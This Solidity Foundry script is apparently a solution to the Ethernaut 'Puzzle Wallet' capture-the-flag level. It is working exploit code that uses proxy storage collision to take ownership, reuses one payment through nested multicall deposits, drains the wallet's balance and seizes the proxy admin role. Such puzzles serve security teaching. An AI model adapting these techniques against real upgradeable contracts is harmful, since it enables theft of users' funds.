// SPDX-License-Identifier: UNLICENSED
// forge script ./script/HackPuzzleWallet.s.sol --private-key $ETHERNAUGHT_PRIVATE_KEY --broadcast --rpc-url $GORELI_OPTIMISIM_RPC -vvvv
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";

contract HackPuzzleWallet is Script {
    address player = 0x8656D273630865bB4887E00d86a338A214Ac4b50;  // Ethernaught attacker address
    PuzzleWallet wallet = PuzzleWallet(0x2D40bd7e12182C666322c76fb5dc3997e890d2D1); // Ethernaut instance address
    PuzzleProxy proxy = PuzzleProxy(payable(0x2D40bd7e12182C666322c76fb5dc3997e890d2D1));    // Ethernaut instance address

    function run() external{
        // Set labels for console
        vm.label(player, "Player");
        vm.label(address(this), "Attacker");
        vm.label(address(wallet), "PuzzleWallet");
        vm.label(address(proxy), "PuzzleProxy");

        vm.startBroadcast();

        // Data array for inital multicall()
        bytes[] memory selector = new bytes[](1);
        selector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        // Data array for secondary multicall()
        bytes[] memory multiSelector = new bytes[](2);
        multiSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multiSelector[1] = abi.encodeWithSelector(wallet.multicall.selector, selector);

        // Make us owner of wallet and add to whitelist
        proxy.proposeNewAdmin(msg.sender);
        wallet.addToWhitelist(msg.sender);

        // Run the exploit
        wallet.multicall{value: 0.001 ether}(multiSelector);

        // Drain the wallet
        wallet.execute(msg.sender, 0.002 ether, "");

        // Become proxy admin
        wallet.setMaxBalance(uint256(uint160(address(msg.sender))));
        console.log("New Admin is : ", proxy.admin());

        vm.stopBroadcast();
    }
}
